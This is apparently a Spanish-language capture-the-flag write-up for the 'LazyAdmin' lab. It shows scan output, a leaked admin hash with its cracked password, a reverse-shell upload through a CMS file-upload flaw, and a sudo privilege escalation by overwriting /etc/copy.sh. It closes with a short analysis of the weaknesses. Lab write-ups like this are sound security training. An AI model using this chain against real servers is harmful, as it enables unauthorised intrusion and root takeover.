# LazyAdmin
## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
```
## Enum
### HTTP
#### Gobuster
```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/content (Status: 301)
/server-status (Status: 403)
```
#### Content
##### Gbusting 2
```
/_themes (Status: 301)
/as (Status: 301) <- Login
/attachment (Status: 301)
/changelog.txt (Status: 200)
/images (Status: 301)
/inc (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/license.txt (Status: 200)
```
##### Changelog.txt
En este archivo podemos ver que la version del CMS es la 1.5.0
##### Inc
Dentro de inc podemos encontrar un backup de sql donde tenemos user y pass de la web
```
admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb
```

## Exploit
Existe un authenticated arbitrary file upload para esta version del CMS, con lo que tenemos podemos ejecutarlo y subir una web shell
* 1. Crackeamos el hash
```
Password123
```
* 2. Nos logeamos en el endpoint de /as
* 3. Nos vamos al media center
* 4. Subimos una revshell php con la terminación php5
* 5. Vamos a /content/attachment
* 6. Enjoy RCE como www-data

## Privesc
```
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
Veamos que hace ese script
`` `
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
Hace referencia a un script llamado copy.sh al que si podemos cambiar
```
echo '/bin/bash' > /etc/copy.sh
```
Y ya solo nos quedaria hacer 
```
sudo /usr/bin/perl /home/itguy/backup.pl
```
Y ya tendriamos shell como root

# Analisis de la intrusión
### Sensible data exposure
Un backup de la db con las credenciales del administrador quedo expuesto, esto nos permitio tomar el control del servicio web, ya que la contraseña encontrada fue facilmente crackeable
### Vulnerable CMS version
El CMS en cuestión permitia subir archivos php cambiando la extension a php5, esto nos permitio subir una reverse shell al servidor y ganar RCE como www-data
### Weak permisions
El usuario www-data podia leer archivos dentro de la carpeta de itguy ademas de editar scripts a los que podia llamar de manera privilegiada, esto hizo que elevaramos privilegios hasta root
